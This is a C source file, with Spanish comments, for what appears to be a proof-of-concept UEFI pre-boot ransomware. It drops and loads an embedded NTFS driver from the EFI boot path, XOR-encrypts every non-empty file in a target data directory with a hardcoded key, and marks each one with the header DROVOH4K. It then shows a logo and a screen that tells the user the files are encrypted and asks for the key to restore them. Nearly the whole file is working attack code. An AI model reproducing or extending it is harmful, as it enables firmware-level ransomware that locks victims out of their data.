//  _____                                               _____
// ( ___ )                                             ( ___ )
//  |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   |
//  |   |  __  __         _               ____        |   |
//  |   | |  \/  |  __ _ (_) _ __        / ___|       |   |
//  |   | | |\/| | / _` || || '_ \      | |           |   |
//  |   | | |  | || (_| || || | | |  _  | |___        |   |
//  |   | |_|  |_| \__,_||_||_| |_| (_)  \____|       |   |
//  |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___|
// (_____)                                             (_____)


// ============================================================================
// INCLUDES
// ============================================================================

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Protocol/SimpleFileSystem.h>
#include <Guid/FileInfo.h>

#include <Utils/UtilsFiles.h>
#include <Utils/UtilsGraphics.h>
#include <Utils/UtilsUi.h>

#include <Payloads/PayloadsNtfs_AA64.h>
#include <Payloads/PayloadsLogoBmp.h>


// ============================================================================
// CONFIGURACIÓN
// ============================================================================

CONST CHAR16  *gDriverPath      = L"\\EFI\\Boot\\ntfs_x64_rw.efi";
CONST CHAR16  *gTargetDirectory = L"fs2:\\data";
CONST UINT8    gXorKey[]        = "demo";

#define COMBO_KEY_SIZE   (sizeof(gXorKey) - 1)
#define NTFS_MAX_FILES   1024

// Marcador de estado: primeros 8 bytes del fichero cifrado == DROVOH4K
STATIC CONST UINT8 gDrovoMagic[8] = { 'D','R','O','V','O','H','4','K' };
#define DROVO_MAGIC_LEN  8


// ============================================================================
// CONTEXTO PARA EL CALLBACK DE LA PANTALLA
// ============================================================================

typedef struct {
    CONST UINT8  *XorKey;
    UINTN         XorKeySize;
    CONST CHAR16 *TargetDirectory;
    UINTN         NewlyEncrypted;
    CHAR16        FeedbackMsg[80];
    BOOLEAN       ExitRequested;
} COMBO_CONTEXT;


// ============================================================================
// HELPERS INTERNOS
// ============================================================================

STATIC
EFI_STATUS
ExtractEfiPath (
    IN  CONST CHAR16  *ShellPath,
    OUT CHAR16       **EfiPath
)
{
    CONST CHAR16 *PathPart;
    UINTN        Index;
    UINTN        PathLen;
    UINTN        ResultChars;
    CHAR16       *Result;
    BOOLEAN      NeedsSlash;

    PathPart = ShellPath;
    for (Index = 0; ShellPath[Index] != L'\0'; Index++)
    {
        if (ShellPath[Index] == L':')
        {
            PathPart = &ShellPath[Index + 1];
            break;
        }
    }

    if (PathPart[0] == L'\0') { PathPart = L"\\"; }

    PathLen      = StrLen(PathPart);
    NeedsSlash   = (PathPart[0] != L'\\' && PathPart[0] != L'/');
    ResultChars  = PathLen + (NeedsSlash ? 1 : 0) + 1;

    Result = AllocateZeroPool(ResultChars * sizeof(CHAR16));
    if (Result == NULL) { return EFI_OUT_OF_RESOURCES; }

    if (NeedsSlash)
    {
        StrCpyS(Result, ResultChars, L"\\");
        StrCatS(Result, ResultChars, PathPart);
    }
    else
    {
        StrCpyS(Result, ResultChars, PathPart);
    }

    for (Index = 0; Result[Index] != L'\0'; Index++)
    {
        if (Result[Index] == L'/') { Result[Index] = L'\\'; }
    }

    *EfiPath = Result;
    return EFI_SUCCESS;
}


STATIC
BOOLEAN
InputMatchesKey (
    IN CONST CHAR16 *Input,
    IN CONST UINT8  *Key,
    IN UINTN        KeySize
)
{
    UINTN InputLen;
    UINTN I;

    InputLen = StrLen(Input);
    if (InputLen != KeySize) { return FALSE; }

    for (I = 0; I < KeySize; I++)
    {
        if ((UINT8)Input[I] != Key[I]) { return FALSE; }
    }
    return TRUE;
}


// ============================================================================
// CIFRADO DE FICHERO INDIVIDUAL
// Detecta magic DROVOH4K: si ya está, skip. Si no, XOR + prepend magic.
// El fichero crece DROVO_MAGIC_LEN bytes (no hay rename ni delete).
// ============================================================================

STATIC
EFI_STATUS
EncryptFile (
    IN EFI_FILE_PROTOCOL *Dir,
    IN CONST CHAR16      *FileName,
    IN CONST UINT8       *Key,
    IN UINTN             KeySize
)
{
    EFI_STATUS        Status;
    EFI_FILE_PROTOCOL *File;
    EFI_FILE_INFO     *Info;
    UINTN             InfoSize;
    UINTN             GetSize;
    UINTN             FileSize;
    UINT8             *PlainBuf;
    UINT8             *EncBuf;
    UINTN             IoSize;

    File   = NULL;
    Status = Dir->Open(Dir, &File, (CHAR16 *)FileName,
                       EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( EncryptFile )-> Open: %r\n", Status);
        return Status;
    }

    InfoSize = SIZE_OF_EFI_FILE_INFO + 512 * sizeof(CHAR16);
    Info     = AllocateZeroPool(InfoSize);
    if (Info == NULL) { File->Close(File); return EFI_OUT_OF_RESOURCES; }

    GetSize = InfoSize;
    Status  = File->GetInfo(File, &gEfiFileInfoGuid, &GetSize, Info);
    if (EFI_ERROR(Status) || Info->FileSize == 0)
    {
        FreePool(Info); File->Close(File);
        return EFI_SUCCESS;  // fichero vacío o error de info: skip silencioso
    }
    FileSize = (UINTN)Info->FileSize;
    FreePool(Info);

    // Leer contenido actual
    PlainBuf = AllocateZeroPool(FileSize);
    if (PlainBuf == NULL) { File->Close(File); return EFI_OUT_OF_RESOURCES; }

    File->SetPosition(File, 0);
    IoSize = FileSize;
    Status = File->Read(File, &IoSize, PlainBuf);
    if (EFI_ERROR(Status) || IoSize != FileSize)
    {
        ZeroMem(PlainBuf, FileSize); FreePool(PlainBuf); File->Close(File);
        return EFI_ERROR(Status) ? Status : EFI_DEVICE_ERROR;
    }

    // Comprobar si ya está cifrado (primeros DROVO_MAGIC_LEN bytes == magic)
    if (FileSize >= DROVO_MAGIC_LEN &&
        CompareMem(PlainBuf, gDrovoMagic, DROVO_MAGIC_LEN) == 0)
    {
        ZeroMem(PlainBuf, FileSize); FreePool(PlainBuf); File->Close(File);
        return EFI_SUCCESS;  // ya cifrado: skip
    }

    // XOR todo el contenido
    UtilsFiles_TransformBufferXor(PlainBuf, FileSize, Key, KeySize);

    // Buffer final: [DROVOH4K (8 bytes)] + [contenido XOR'd]
    EncBuf = AllocateZeroPool(DROVO_MAGIC_LEN + FileSize);
    if (EncBuf == NULL)
    {
        ZeroMem(PlainBuf, FileSize); FreePool(PlainBuf); File->Close(File);
        return EFI_OUT_OF_RESOURCES;
    }

    CopyMem(EncBuf,                  gDrovoMagic, DROVO_MAGIC_LEN);
    CopyMem(EncBuf + DROVO_MAGIC_LEN, PlainBuf,   FileSize);
    ZeroMem(PlainBuf, FileSize); FreePool(PlainBuf);

    // Escribir — el fichero se extiende automáticamente DROVO_MAGIC_LEN bytes
    File->SetPosition(File, 0);
    IoSize = DROVO_MAGIC_LEN + FileSize;
    Status = File->Write(File, &IoSize, EncBuf);
    ZeroMem(EncBuf, DROVO_MAGIC_LEN + FileSize); FreePool(EncBuf);

    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( EncryptFile )-> Write: %r\n", Status);
        File->Close(File);
        return Status;
    }

    File->Flush(File);
    File->Close(File);

    Print(L"[ SUCCESS ]-{ main.c }-( EncryptFile )-> %s cifrado.\n", FileName);
    return EFI_SUCCESS;
}


// ============================================================================
// DESCIFRADO DE FICHERO INDIVIDUAL
// Detecta magic DROVOH4K: si no está, skip. Si está, strip + XOR + truncar.
// ============================================================================

STATIC
EFI_STATUS
DecryptFile (
    IN EFI_FILE_PROTOCOL *Dir,
    IN CONST CHAR16      *FileName,
    IN CONST UINT8       *Key,
    IN UINTN             KeySize
)
{
    EFI_STATUS        Status;
    EFI_FILE_PROTOCOL *File;
    EFI_FILE_INFO     *Info;
    UINTN             InfoSize;
    UINTN             GetSize;
    UINTN             EncSize;
    UINTN             OrigSize;
    UINT8             *EncBuf;
    UINTN             IoSize;

    File   = NULL;
    Status = Dir->Open(Dir, &File, (CHAR16 *)FileName,
                       EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( DecryptFile )-> Open: %r\n", Status);
        return Status;
    }

    InfoSize = SIZE_OF_EFI_FILE_INFO + 512 * sizeof(CHAR16);
    Info     = AllocateZeroPool(InfoSize);
    if (Info == NULL) { File->Close(File); return EFI_OUT_OF_RESOURCES; }

    GetSize = InfoSize;
    Status  = File->GetInfo(File, &gEfiFileInfoGuid, &GetSize, Info);
    if (EFI_ERROR(Status) || Info->FileSize <= DROVO_MAGIC_LEN)
    {
        FreePool(Info); File->Close(File);
        return EFI_SUCCESS;  // demasiado pequeño para estar cifrado: skip
    }
    EncSize  = (UINTN)Info->FileSize;
    OrigSize = EncSize - DROVO_MAGIC_LEN;

    // Leer contenido cifrado completo
    EncBuf = AllocateZeroPool(EncSize);
    if (EncBuf == NULL) { FreePool(Info); File->Close(File); return EFI_OUT_OF_RESOURCES; }

    File->SetPosition(File, 0);
    IoSize = EncSize;
    Status = File->Read(File, &IoSize, EncBuf);
    if (EFI_ERROR(Status) || IoSize != EncSize)
    {
        ZeroMem(EncBuf, EncSize); FreePool(EncBuf); FreePool(Info); File->Close(File);
        return EFI_ERROR(Status) ? Status : EFI_DEVICE_ERROR;
    }

    // Comprobar magic — si no está, no está cifrado: skip
    if (CompareMem(EncBuf, gDrovoMagic, DROVO_MAGIC_LEN) != 0)
    {
        ZeroMem(EncBuf, EncSize); FreePool(EncBuf); FreePool(Info); File->Close(File);
        return EFI_SUCCESS;
    }

    // XOR el contenido (sin el magic header)
    UINT8 *ContentPtr = EncBuf + DROVO_MAGIC_LEN;
    UtilsFiles_TransformBufferXor(ContentPtr, OrigSize, Key, KeySize);

    // Escribir contenido descifrado desde posición 0
    File->SetPosition(File, 0);
    IoSize = OrigSize;
    Status = File->Write(File, &IoSize, ContentPtr);
    ZeroMem(EncBuf, EncSize); FreePool(EncBuf);

    if (EFI_ERROR(Status))
    {
        FreePool(Info); File->Close(File);
        Print(L"[ ERROR ]-{ main.c }-( DecryptFile )-> Write: %r\n", Status);
        return Status;
    }

    File->Flush(File);

    // Truncar fichero a OrigSize (eliminar los DROVO_MAGIC_LEN bytes sobrantes)
    // SetInfo para cambio de tamaño — distinto del rename que fallaba
    Info->FileSize     = OrigSize;
    Info->PhysicalSize = OrigSize;
    Status = File->SetInfo(File, &gEfiFileInfoGuid, GetSize, Info);
    FreePool(Info);

    if (EFI_ERROR(Status))
    {
        Print(L"[ WARN ]-{ main.c }-( DecryptFile )-> Truncado: %r. Contenido OK, 8 bytes extra al final.\n", Status);
    }

    File->Flush(File);
    File->Close(File);

    Print(L"[ SUCCESS ]-{ main.c }-( DecryptFile )-> %s descifrado.\n", FileName);
    return EFI_SUCCESS;
}


// ============================================================================
// ITERA DIRECTORIO Y APLICA EncryptFile A CADA FICHERO
// ============================================================================

STATIC
EFI_STATUS
EncryptDirectory (
    IN  CONST CHAR16 *DirShellPath,
    IN  CONST UINT8  *Key,
    IN  UINTN        KeySize,
    OUT UINTN        *OutEncryptedCount
)
{
    EFI_STATUS                      Status;
    EFI_STATUS                      FirstError;
    EFI_STATUS                      FileStatus;
    CHAR16                         *EfiDirPath;
    EFI_HANDLE                     *HandleBuffer;
    UINTN                           HandleCount;
    UINTN                           VolumeIdx;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_FILE_PROTOCOL               *Root;
    EFI_FILE_PROTOCOL               *TargetDir;
    EFI_FILE_INFO                   *FileInfo;
    UINTN                           FileInfoSize;
    UINTN                           ReadSize;
    UINTN                           ProcessedCount;
    UINTN                           ErrorCount;

    if (OutEncryptedCount != NULL) { *OutEncryptedCount = 0; }

    EfiDirPath   = NULL;
    HandleBuffer = NULL;
    HandleCount  = 0;
    FirstError   = EFI_NOT_FOUND;

    Status = ExtractEfiPath(DirShellPath, &EfiDirPath);
    if (EFI_ERROR(Status)) { return Status; }

    Print(L"[ INFO ]-{ main.c }-( EncryptDirectory )-> Buscando %s...\n", EfiDirPath);

    Status = gBS->LocateHandleBuffer(
        ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
        NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) { FreePool(EfiDirPath); return Status; }

    for (VolumeIdx = 0; VolumeIdx < HandleCount; VolumeIdx++)
    {
        FileSystem = NULL; Root = NULL; TargetDir = NULL;

        Status = gBS->HandleProtocol(HandleBuffer[VolumeIdx],
            &gEfiSimpleFileSystemProtocolGuid, (VOID **)&FileSystem);
        if (EFI_ERROR(Status)) { continue; }

        Status = FileSystem->OpenVolume(FileSystem, &Root);
        if (EFI_ERROR(Status)) { continue; }

        Status = Root->Open(Root, &TargetDir, EfiDirPath,
            EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
        if (EFI_ERROR(Status))
        {
            if (FirstError == EFI_NOT_FOUND) { FirstError = Status; }
            Root->Close(Root); continue;
        }

        Print(L"[ SUCCESS ]-{ main.c }-( EncryptDirectory )-> Directorio en volumen #%u\n", VolumeIdx);
        FirstError = EFI_SUCCESS;

        // --- FASE 1: recopilar nombres (ntfs-3g lock durante Read) ---
        CHAR16 **FileNames = AllocateZeroPool(NTFS_MAX_FILES * sizeof(CHAR16 *));
        UINTN   FileCount  = 0;

        FileInfoSize = SIZE_OF_EFI_FILE_INFO + 512 * sizeof(CHAR16);
        FileInfo     = AllocateZeroPool(FileInfoSize);

        if (FileNames == NULL || FileInfo == NULL)
        {
            if (FileNames != NULL) { FreePool(FileNames); }
            if (FileInfo  != NULL) { FreePool(FileInfo);  }
            TargetDir->Close(TargetDir); Root->Close(Root);
            Status = EFI_OUT_OF_RESOURCES; break;
        }

        TargetDir->SetPosition(TargetDir, 0);
        while (TRUE)
        {
            ReadSize = FileInfoSize;
            Status   = TargetDir->Read(TargetDir, &ReadSize, FileInfo);
            if (Status == EFI_BUFFER_TOO_SMALL)
            {
                FreePool(FileInfo); FileInfoSize = ReadSize;
                FileInfo = AllocateZeroPool(FileInfoSize);
                if (FileInfo == NULL) { break; }
                continue;
            }
            if (EFI_ERROR(Status) || ReadSize == 0) { break; }
            if ((FileInfo->Attribute & EFI_FILE_DIRECTORY) != 0) { continue; }
            if (FileInfo->FileSize == 0)                          { continue; }

            if (FileCount < NTFS_MAX_FILES)
            {
                FileNames[FileCount] = AllocateCopyPool(StrSize(FileInfo->FileName), FileInfo->FileName);
                if (FileNames[FileCount] != NULL) { FileCount++; }
            }
        }
        FreePool(FileInfo);
        TargetDir->Close(TargetDir); TargetDir = NULL;

        // --- FASE 2: procesar cada fichero con handle fresco ---
        Status = Root->Open(Root, &TargetDir, EfiDirPath,
            EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);

        ProcessedCount = 0; ErrorCount = 0;

        if (EFI_ERROR(Status))
        {
            Print(L"[ ERROR ]-{ main.c }-( EncryptDirectory )-> Reopen: %r\n", Status);
        }
        else
        {
            UINTN FileIdx;
            for (FileIdx = 0; FileIdx < FileCount; FileIdx++)
            {
                Print(L"\n[ INFO ]-{ main.c }-( EncryptDirectory )-> Procesando: %s\n", FileNames[FileIdx]);
                FileStatus = EncryptFile(TargetDir, FileNames[FileIdx], Key, KeySize);
                if (EFI_ERROR(FileStatus))
                {
                    Print(L"[ ERROR ]-{ main.c }-( EncryptDirectory )-> Fallo en %s: %r\n",
                          FileNames[FileIdx], FileStatus);
                    ErrorCount++;
                    if (!EFI_ERROR(FirstError)) { FirstError = FileStatus; }
                }
                else { ProcessedCount++; }
            }
            TargetDir->Close(TargetDir);
        }

        UINTN FreeIdx;
        for (FreeIdx = 0; FreeIdx < FileCount; FreeIdx++)
        {
            if (FileNames[FreeIdx] != NULL) { FreePool(FileNames[FreeIdx]); }
        }
        FreePool(FileNames);
        Root->Close(Root);

        Print(L"[ INFO ]-{ main.c }-( EncryptDirectory )-> Cifrados: %u | Errores: %u\n",
              ProcessedCount, ErrorCount);

        if (OutEncryptedCount != NULL) { *OutEncryptedCount = ProcessedCount; }
        Status = (ErrorCount > 0) ? FirstError : EFI_SUCCESS;
        goto EncCleanUp;
    }

    Print(L"[ ERROR ]-{ main.c }-( EncryptDirectory )-> %s no encontrado.\n", EfiDirPath);
    Status = FirstError;

EncCleanUp:
    if (HandleBuffer != NULL) { FreePool(HandleBuffer); }
    if (EfiDirPath   != NULL) { FreePool(EfiDirPath);   }
    return Status;
}


// ============================================================================
// ITERA DIRECTORIO Y APLICA DecryptFile A CADA FICHERO
// ============================================================================

STATIC
EFI_STATUS
DecryptDirectory (
    IN CONST CHAR16 *DirShellPath,
    IN CONST UINT8  *Key,
    IN UINTN        KeySize
)
{
    EFI_STATUS                      Status;
    EFI_STATUS                      FirstError;
    EFI_STATUS                      FileStatus;
    CHAR16                         *EfiDirPath;
    EFI_HANDLE                     *HandleBuffer;
    UINTN                           HandleCount;
    UINTN                           VolumeIdx;
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_FILE_PROTOCOL               *Root;
    EFI_FILE_PROTOCOL               *TargetDir;
    EFI_FILE_INFO                   *FileInfo;
    UINTN                           FileInfoSize;
    UINTN                           ReadSize;
    UINTN                           ProcessedCount;
    UINTN                           ErrorCount;

    EfiDirPath   = NULL;
    HandleBuffer = NULL;
    HandleCount  = 0;
    FirstError   = EFI_NOT_FOUND;

    Status = ExtractEfiPath(DirShellPath, &EfiDirPath);
    if (EFI_ERROR(Status)) { return Status; }

    Status = gBS->LocateHandleBuffer(
        ByProtocol, &gEfiSimpleFileSystemProtocolGuid,
        NULL, &HandleCount, &HandleBuffer);
    if (EFI_ERROR(Status)) { FreePool(EfiDirPath); return Status; }

    for (VolumeIdx = 0; VolumeIdx < HandleCount; VolumeIdx++)
    {
        FileSystem = NULL; Root = NULL; TargetDir = NULL;

        Status = gBS->HandleProtocol(HandleBuffer[VolumeIdx],
            &gEfiSimpleFileSystemProtocolGuid, (VOID **)&FileSystem);
        if (EFI_ERROR(Status)) { continue; }

        Status = FileSystem->OpenVolume(FileSystem, &Root);
        if (EFI_ERROR(Status)) { continue; }

        Status = Root->Open(Root, &TargetDir, EfiDirPath,
            EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
        if (EFI_ERROR(Status))
        {
            if (FirstError == EFI_NOT_FOUND) { FirstError = Status; }
            Root->Close(Root); continue;
        }

        Print(L"[ SUCCESS ]-{ main.c }-( DecryptDirectory )-> Directorio en volumen #%u\n", VolumeIdx);
        FirstError = EFI_SUCCESS;

        // --- FASE 1: recopilar nombres ---
        CHAR16 **FileNames = AllocateZeroPool(NTFS_MAX_FILES * sizeof(CHAR16 *));
        UINTN   FileCount  = 0;

        FileInfoSize = SIZE_OF_EFI_FILE_INFO + 512 * sizeof(CHAR16);
        FileInfo     = AllocateZeroPool(FileInfoSize);

        if (FileNames == NULL || FileInfo == NULL)
        {
            if (FileNames != NULL) { FreePool(FileNames); }
            if (FileInfo  != NULL) { FreePool(FileInfo);  }
            TargetDir->Close(TargetDir); Root->Close(Root);
            Status = EFI_OUT_OF_RESOURCES; break;
        }

        TargetDir->SetPosition(TargetDir, 0);
        while (TRUE)
        {
            ReadSize = FileInfoSize;
            Status   = TargetDir->Read(TargetDir, &ReadSize, FileInfo);
            if (Status == EFI_BUFFER_TOO_SMALL)
            {
                FreePool(FileInfo); FileInfoSize = ReadSize;
                FileInfo = AllocateZeroPool(FileInfoSize);
                if (FileInfo == NULL) { break; }
                continue;
            }
            if (EFI_ERROR(Status) || ReadSize == 0) { break; }
            if ((FileInfo->Attribute & EFI_FILE_DIRECTORY) != 0) { continue; }
            if (FileInfo->FileSize == 0)                          { continue; }

            if (FileCount < NTFS_MAX_FILES)
            {
                FileNames[FileCount] = AllocateCopyPool(StrSize(FileInfo->FileName), FileInfo->FileName);
                if (FileNames[FileCount] != NULL) { FileCount++; }
            }
        }
        FreePool(FileInfo);
        TargetDir->Close(TargetDir); TargetDir = NULL;

        // --- FASE 2: procesar ---
        Status = Root->Open(Root, &TargetDir, EfiDirPath,
            EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);

        ProcessedCount = 0; ErrorCount = 0;

        if (EFI_ERROR(Status))
        {
            Print(L"[ ERROR ]-{ main.c }-( DecryptDirectory )-> Reopen: %r\n", Status);
        }
        else
        {
            UINTN FileIdx;
            for (FileIdx = 0; FileIdx < FileCount; FileIdx++)
            {
                FileStatus = DecryptFile(TargetDir, FileNames[FileIdx], Key, KeySize);
                if (EFI_ERROR(FileStatus))
                {
                    Print(L"[ ERROR ]-{ main.c }-( DecryptDirectory )-> Fallo en %s: %r\n",
                          FileNames[FileIdx], FileStatus);
                    ErrorCount++;
                    if (!EFI_ERROR(FirstError)) { FirstError = FileStatus; }
                }
                else { ProcessedCount++; }
            }
            TargetDir->Close(TargetDir);
        }

        UINTN FreeIdx;
        for (FreeIdx = 0; FreeIdx < FileCount; FreeIdx++)
        {
            if (FileNames[FreeIdx] != NULL) { FreePool(FileNames[FreeIdx]); }
        }
        FreePool(FileNames);
        Root->Close(Root);

        Print(L"[ INFO ]-{ main.c }-( DecryptDirectory )-> Descifrados: %u | Errores: %u\n",
              ProcessedCount, ErrorCount);

        Status = (ErrorCount > 0) ? FirstError : EFI_SUCCESS;
        goto DecCleanUp;
    }

    Print(L"[ ERROR ]-{ main.c }-( DecryptDirectory )-> %s no encontrado.\n", EfiDirPath);
    Status = FirstError;

DecCleanUp:
    if (HandleBuffer != NULL) { FreePool(HandleBuffer); }
    if (EfiDirPath   != NULL) { FreePool(EfiDirPath);   }
    return Status;
}


// ============================================================================
// PANTALLA INTERACTIVA — contenido y callback
// ============================================================================

#define SCREEN_TITLE  L"VERIFICACION DE CLAVE XOR"

STATIC CONST UI_LINE ScreenContent[] = {
    { L"Los ficheros de fs2:\\data han sido cifrados con XOR.",  FALSE },
    { L"(Marcador interno: DROVOH4K al inicio de cada fichero)", FALSE },
    { NULL,                                                      FALSE },
    { L"Introduce la clave para descifrar y recuperarlos.",      FALSE },
    { NULL,                                                      FALSE },
    { L"Controles:",                                             TRUE  },
    { L"  ENTER  - validar clave",                               FALSE },
    { L"  ESC    - salir sin descifrar",                         FALSE },
};


STATIC
VOID
EFIAPI
OnTextSubmit (
    IN CONST CHAR16 *Text,
    IN VOID         *Context
)
{
    COMBO_CONTEXT *Ctx;
    EFI_STATUS     Status;
    UINT8          InputKey[UI_MAX_INPUT_CHARS + 1];
    UINTN          InputLen;
    UINTN          I;

    Ctx = (COMBO_CONTEXT *)Context;
    if (Ctx == NULL) { return; }

    ZeroMem(Ctx->FeedbackMsg, sizeof(Ctx->FeedbackMsg));
    Ctx->ExitRequested = FALSE;

    if (!InputMatchesKey(Text, Ctx->XorKey, Ctx->XorKeySize))
    {
        StrCpyS(Ctx->FeedbackMsg, sizeof(Ctx->FeedbackMsg) / sizeof(CHAR16),
                L"[!] Clave incorrecta. Intentalo de nuevo.");
        return;
    }

    InputLen = StrLen(Text);
    ZeroMem(InputKey, sizeof(InputKey));
    for (I = 0; I < InputLen && I < UI_MAX_INPUT_CHARS; I++)
    {
        InputKey[I] = (UINT8)Text[I];
    }

    Status = DecryptDirectory(Ctx->TargetDirectory, InputKey, InputLen);

    if (EFI_ERROR(Status))
    {
        StrCpyS(Ctx->FeedbackMsg, sizeof(Ctx->FeedbackMsg) / sizeof(CHAR16),
                L"[!] Clave correcta pero error al descifrar.");
        return;
    }

    StrCpyS(Ctx->FeedbackMsg, sizeof(Ctx->FeedbackMsg) / sizeof(CHAR16),
            L"[OK] Clave correcta. Archivos descifrados.");
    Ctx->ExitRequested = TRUE;
}


// ============================================================================
// ENTRY POINT
// ============================================================================

EFI_STATUS
EFIAPI
UefiMain (
    IN EFI_HANDLE       ImageHandle,
    IN EFI_SYSTEM_TABLE *SystemTable
)
{
    EFI_STATUS                    Status;
    EFI_HANDLE                    DriverHandle              = NULL;
    BOOLEAN                       DriverWasAlreadyAvailable = FALSE;
    EFI_GRAPHICS_OUTPUT_PROTOCOL *GraphicsOutput            = NULL;
    COMBO_CONTEXT                 ComboCtx;
    UINTN                         EncryptedCount            = 0;

    Print(L"\n\n=====================================================\n");
    Print(L"Iniciando UefiApplication_Combo\n");
    Print(L"=====================================================\n\n");

    // -------------------------------------------------------------------------
    // SECCION 1: Driver NTFS
    // -------------------------------------------------------------------------

    Status = UtilsFiles_DirectoryExists(gTargetDirectory);
    if (!EFI_ERROR(Status))
    {
        DriverWasAlreadyAvailable = TRUE;
        Print(L"[ SUCCESS ]-{ main.c }-( UefiMain )-> Driver NTFS ya cargado.\n");
    }

    if (!DriverWasAlreadyAvailable)
    {
        Print(L"[ INFO ]-{ main.c }-( UefiMain )-> Cargando driver NTFS...\n");

        Status = UtilsFiles_WriteFile(
            NULL, gDriverPath,
            Global_PayloadsNtfsDriver_Ntfs3g,
            sizeof(Global_PayloadsNtfsDriver_Ntfs3g));
        if (EFI_ERROR(Status))
        {
            Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> WriteFile: %r\n", Status);
            return Status;
        }

        Status = UtilsFiles_LoadAndStartImageFile(gDriverPath, &DriverHandle);
        if (EFI_ERROR(Status) || DriverHandle == NULL)
        {
            Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> LoadDriver: %r\n", Status);
            return EFI_ERROR(Status) ? Status : EFI_UNSUPPORTED;
        }
        Print(L"[ SUCCESS ]-{ main.c }-( UefiMain )-> Driver NTFS activo.\n");
    }

    // -------------------------------------------------------------------------
    // SECCION 2: Cifrado XOR con magic header DROVOH4K
    // EncryptFile detecta automáticamente si cada fichero ya está cifrado.
    // -------------------------------------------------------------------------

    Print(L"[ INFO ]-{ main.c }-( UefiMain )-> Cifrando: %s\n", gTargetDirectory);

    Status = EncryptDirectory(gTargetDirectory, gXorKey, COMBO_KEY_SIZE, &EncryptedCount);
    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> EncryptDirectory: %r\n", Status);
        return Status;
    }

    if (EncryptedCount > 0)
        Print(L"[ SUCCESS ]-{ main.c }-( UefiMain )-> %u fichero(s) cifrado(s).\n", EncryptedCount);
    else
        Print(L"[ INFO ]-{ main.c }-( UefiMain )-> Ficheros ya cifrados. Nada que hacer.\n");

    // -------------------------------------------------------------------------
    // SECCION 3: Pantalla interactiva (GOP)
    // -------------------------------------------------------------------------

    Status = UtilsGraphics_LocateGraphicsOutputProtocol(&GraphicsOutput);
    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> GOP: %r\n", Status);
        return Status;
    }

    UtilsGraphics_SetConsoleOutputToHighestTextResolution();
    if (gST != NULL && gST->ConOut != NULL)
    {
        gST->ConOut->ClearScreen(gST->ConOut);
    }

    Status = UtilsGraphics_DrawBmpCentered(
        GraphicsOutput, Global_PayloadsLogoBmp_Image, Global_PayloadsLogoBmp_ImageSize);
    if (!EFI_ERROR(Status))
    {
        gBS->Stall(3 * 1000 * 1000);
    }

    ZeroMem(&ComboCtx, sizeof(ComboCtx));
    ComboCtx.XorKey          = gXorKey;
    ComboCtx.XorKeySize      = COMBO_KEY_SIZE;
    ComboCtx.TargetDirectory = gTargetDirectory;
    ComboCtx.NewlyEncrypted  = EncryptedCount;

    UI_SCREEN_CONFIG Config;
    Config.Title           = SCREEN_TITLE;
    Config.Lines           = ScreenContent;
    Config.LineCount       = sizeof(ScreenContent) / sizeof(ScreenContent[0]);
    Config.OnSubmit        = OnTextSubmit;
    Config.OnSubmitContext  = &ComboCtx;
    Config.FeedbackLine    = ComboCtx.FeedbackMsg;
    Config.FeedbackLineLen = sizeof(ComboCtx.FeedbackMsg) / sizeof(CHAR16);
    Config.RequestExit     = &ComboCtx.ExitRequested;

    Status = UtilsUi_ShowScreen(GraphicsOutput, &Config);
    if (EFI_ERROR(Status))
    {
        Print(L"[ ERROR ]-{ main.c }-( UefiMain )-> ShowScreen: %r\n", Status);
        return Status;
    }

    return EFI_SUCCESS;
}
